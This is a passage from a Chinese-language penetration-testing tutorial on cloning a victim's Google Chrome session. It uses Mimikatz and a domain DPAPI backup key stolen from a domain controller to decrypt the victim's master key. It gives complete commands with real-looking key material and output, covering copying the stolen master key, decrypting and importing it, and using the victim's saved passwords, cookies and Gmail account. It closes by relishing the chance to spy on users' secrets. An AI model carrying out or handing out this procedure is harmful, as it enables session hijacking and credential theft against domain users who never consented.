    C:\users\kbell\appdata\Roaming\Microsoft\Protect>get C:\Windows\Temp\keys.zip[*] Downloading C:\\Windows\Temp\keys.zip
### 克隆谷歌浏览器受害者的会话
首先要确保本地安装了谷歌浏览器，然后将刚获得的文件复制到本地主机上。为了尽量减少环境干扰因素，最好在与受害主机相同的位置使用设置了 VPN
的虚拟机。之后可能会有行为分析和异常检测防御，这是建立了新连接或者在异常位置建立了连接都会有的行为。
现在要进入到特定目录去替换掉一些文件。大家可以替换整个 `User Data`
文件夹，这是最简单便捷的方法。但是，如果您只下载了之前指定的所需文件，只需替换计算机上谷歌浏览器文件夹中的对应文件即可。
接着，将密钥文件移动到mimikatz.exe所在文件夹。虽然这一步不是强制性的，但它会使后面的命令执行更简单。记住，因为这些是系统文件，要使用`xcopy
/H`命令才能复制文件。
    C:\Users\rifle\Desktop\mimikatz_trunk\x64>xcopy /H S-1-5-21-1968630676-249568448-    1092335803-4255\98ec219d-d8c0-4d35-be33-8dca90bba887 
    C:\Users\rifle\Desktop\mimikatz_trunk\x64\
    S-1-5-21-1968630676-249568448-1092335803-4255\98ec219d-d8c0-4d35-be33-8dca90bba887
    1 File(s) copied
### 使用域备份密钥解密受害主机的主密钥
现在，使用 Mimikatz来解密用户的密钥。
    mimikatz # dpapi::masterkey /in:98ec219d-d8c0-4d35-be33-8dca90bba887 
    /pvk:ntds_capi_0_116e39f3-e091-4b58-88ff-8f232466b5d6.keyx.rsa.pvk
解释一下每个参数：
  * `/in:98ec219d-d8c0-4d35-be33-8dca90bba887`：这是从目标主机窃取的主密钥，是使用`xcopy`之前复制的文件。从技术上讲，这是目标用户的主密钥，用于解密谷歌浏览器中存储的机密信息。
  * `/pvk:ntds_capi_0_116e39f3-e091-4b58-88ff-8f232466b5d6.keyx.rsa.pvk`：这是从域控窃取的备份密钥。备份密钥的真正魔力在于：这个pvk文件（私钥）可以解密和打开任何域用户的任何主密钥。也即：我们可以解密谷歌浏览器存储的任何域用户的 cookie 和凭据。
下面是命令的输出结果：
    mimikatz # dpapi::masterkey /in:98ec219d-d8c0-4d35-be33-8dca90bba887 
    /pvk:ntds_capi_0_116e39f3-e091-4b58-88ff-8f232466b5d6.keyx.rsa.pvk
    **MASTERKEYS**
      dwVersion          : 00000002 - 2
      szGuid             : {98ec219d-d8c0-4d35-be33-8dca90bba887}
      dwFlags            : 00000000 - 0
      dwMasterKeyLen     : 00000088 - 136
      dwBackupKeyLen     : 00000068 - 104
      dwCredHistLen      : 00000000 - 0
      dwDomainKeyLen     : 00000174 - 372
    [masterkey]
      **MASTERKEY**
        dwVersion        : 00000002 - 2
        salt             : 139b2ddb0f6157e36c33354411933dbb
        rounds           : 00004650 - 18000
        algHash          : 00008009 - 32777 (CALG_HMAC)
        algCrypt         : 00006603 - 26115 (CALG_3DES)
        pbKey            : 31665abe3bf63900f6578032f201160e895380a43b233cc532ff219cee8328
    9187a2c64086c83884141cf5b5503f7be632da32e7dc4e09b74142e87faddcac00799ced7e044473fe7b2
    fcaef30076ced3c53e7542d855c1e92bccbc04dbe4e8a1202ad1bb3c54bac
    [backupkey]
      **MASTERKEY**
        dwVersion        : 00000002 - 2
        salt             : a1a13ca2f183652cbcf22f01eb3d2ea1
        rounds           : 00004650 - 18000
        algHash          : 00008009 - 32777 (CALG_HMAC)
        algCrypt         : 00006603 - 26115 (CALG_3DES)
        pbKey            : 7618cec63bdf186b14ecfcabf2f4494d6b2c124dfbacce3f4f50cb9b5de4dc11
    984d8004204a70fbe8f2826e5cd1d2197dcd01d8e0084f44165c27cb99229d47cdc51bcb86ed0c8b
    [domainkey]
      **DOMAINKEY**
        dwVersion        : 00000002 - 2
        dwSecretLen      : 00000100 - 256
        dwAccesscheckLen : 00000058 - 88
        guidMasterKey    : {116e39f3-e091-4b58-88ff-8f232466b5d6}
        pbSecret         : c576997e887abec3cd542eca7acb4eeb5d2a79bdd7ebecc7af3b5e2b7c36fd2f418a
    67bb5f29efb886197a3de85ae1bee404dbd434da2ec43a55f200e3f8f6f9bd27d7e2193dfe62ee4a7a637445a3a
    6410b0785b992afd9c1acbf560b97d1ebcba9efbd560236129a34b96b4e2f3895ba026e73afe3bbcc8bcdb95bbd
    279d012da3d49e15c97996a41fd8ad1d59d3082d2d8f8cdf33d74a6ea27c89eba8efb9df072b6851ba5ba92886b
    7323b073b141ff8391036337cf1a94abfb30a793be9025cd6ca44a02921ab201e47eeaa83f44ba375e2d30cc414
    f127a541e74463d7c4f16b56a473ff56750f30793b3d65bf4fe3c80dcb4ec5de5774a364f483bb36
        pbAccesscheck    : 3da9473de0cc6c054448acda415a1c86a32e7db3a7c2359b9e55dda23c419b37f390
    0bb53a15e02df75411c510abba59a43f71d0577871fa62d000598aa9232ec720a75719122d8900a4a37f986ff17
    d5a30fe372809a1f2
    [domainkey] with RSA private key
      key : 9a6f199e3d2e698ce78fdeeefadc85c527c43b4e3c5518c54e95718842829b12912567ca0713c4bd
    0cf74743c81c1d32bbf10020c9d72d58c99e731814e4155b
      sha1: f8b1f1f7cd3efdd4c07ef7b955ad27b254694fbe
      sid : S-1-5-21-1968630676-249568448-1092335803-4255
输出得到的一个重要东西是私有值（在输出的最后）。在我们的例子中，具体为：
    9a6f199e3d2e698ce78fdeeefadc85c527c43b4e3c5518c54e957188​​42829b12912567ca0713c4bd0cf
    74743c81c1d32bbf10020c9d72d58c99e731814e4155b
该键对应于用户`core.internal\kbell`。
## 压轴大戏：将解密的密钥导入内存
此时，我们已经拥有在目标主机上重建谷歌浏览器的状态和环境所需的所有信息。
从上一个命令输出中，我们必须复制该`szGuid`值。本例中，该值为`{98ec219d-d8c0-4d35-be33-8dca90bba887}`。
现在，要将受害主机的密钥导入内存，执行以下命令：
    mimikatz # dpapi::create /guid:{98ec219d-d8c0-4d35-be33-8dca90bba887} /key:9a6f199e3d2e698ce
    78fdeeefadc85c527c43b4e3c5518c54e95718842829b12912567ca0713c4bd0cf74743c81c1d32bbf10020c9d72
    d58c99e731814e4155b /password:pentest1122 /protected
参数解释如下：
  * `/guid:{98ec219d-d8c0-4d35-be33-8dca90bba887}`: 如前所述，这是从之前执行的命令中获得的 `szGuid` 值。
  * `/key:9a6f199e3d2e698ce78fdeeefadc85c527c43b4e3c5518c54e95718842829b12912567ca0713c4bd0cf74743c81c1d32bbf10020c9d72d58c99e731814e4155b`：这是受害主机的密钥，也是在上一步中获得的。
  * `/password:pentest1122`：这是攻击者主机用户的密码。注意它不是受害者的密码。Mimikatz 需要我们的密码才能在我们的 Windows 机器中正确设置会话。
最后得到类似于下图的输出：
重要提示：上一条命令的结果应该输出为`( hidden & system):
OK`。这意味着新的主密钥文件已正确写入。如果我们收到类似的错误：`(hidden & system): ERROR
kuhl_m_dpapi_create；kull_m_file_writeData (0x00000005)`，这意味着我们在 Mimikatz
试图生成新密钥的同一路径中拥有主密钥的旧副本，而Mimikatz
不会覆盖此文件。要解决这个问题，我们只需要删除或移走那个旧的主密钥文件，然后再执行指定的命令。由于该密钥文件是一个隐藏文件，需要使用以下命令来删除：
    del /a 98ec219d-d8c0-4d35-be33-8dca90bba887
执行该命令后，再次执行 Mimikatz 应该可以正确生成文件。
最后，我们需要将生成的文件复制到`%appdata%`文件夹，以便系统可以读取该文件。
    xcopy /H C:\Users\rifle\Desktop\mimikatz_trunk\x64\98ec219d-d8c0-4d35-be33-8dca90bba887 
    C:\Users\rifle\AppData\Roaming\Microsoft\Protect\S-1-5-21-3317543668-4020658003-1568697172-1005\
    C:\Users\rifle\AppData\Roaming\Microsoft\Protect\S-1-5-21-3317543668-4020658003-1568697172-1005>dir /a
     Volume in drive C has no label.
     Volume Serial Number is 36A0-B333
     Directory of C:\Users\rifle\AppData\Roaming\Microsoft\Protect\S-1-5-21-3317543668-4020658003-1568697172-1005
    04/21/2020  10:48 PM              .
    04/21/2020  10:48 PM              ..
    04/04/2020  05:33 PM               468 313b61dd-628c-4f0d-9a20-512e6739c77e
    04/21/2020  10:45 PM               264 98ec219d-d8c0-4d35-be33-8dca90bba887
    04/04/2020  05:33 PM               468 aa9b4e7e-72bc-44d1-a9a7-5c03e8e2bcac
    04/18/2020  05:39 PM               468 db625e2f-2afd-4c87-ae15-4fdc06b24114
    04/04/2020  05:33 PM               468 e45f6792-0158-499b-b063-fc050f4908d1
    04/18/2020  05:39 PM                24 Preferred
                   6 File(s)          2,160 bytes
                   2 Dir(s)   5,424,898,048 bytes free
如上图，`98ec219d-d8c0-4d35-be33-8dca90bba887`现在出现在我们电脑的`\Microsoft\Protect\SID`文件夹中（Windows本地用户下）。
最后，我们打开谷歌浏览器...
……大家快康！！！！
我们成功克隆了受害主机的谷歌浏览器会话。现在可以访问受害者存储的密码、历史记录和书签。上面的屏幕截图显示了我们能够登录到受害者的 Gmail 帐户。
这种类型的攻击的意义在于，渗透测试员或红队人员能够持续使用云服务，而不必持续登录受害者的主机。当受害者使用基于 Web 的密码管理器或 SSO
门户网站来访问公司的应用程序并且会话 cookie 保持有效时，这会非常有用。此外，如果用户没有使用额外的 Chrome
主密码保护它们，攻击者就可以访问所有保存的密码。
## 结论
作为渗透测试人员，拥有不止一种方法来成功渗透目标是很有用的。如果过程中遇到任何障碍，换个思路会有所帮助。
在这种情况下，获得受害主机的访问权限可能还不够——我们可能需要更进一步来获取更多敏感信息。事实上，有必要深入研究该公司使用的不同服务以找到有用的东西。想象一下，在用户共享密码或机密信息或使用云驱动器中的共享文档的情况下，你可以偷窥他们的信息，是不是感觉很爽？在这种情况下，换个思路可能才是达成目标的理想选择。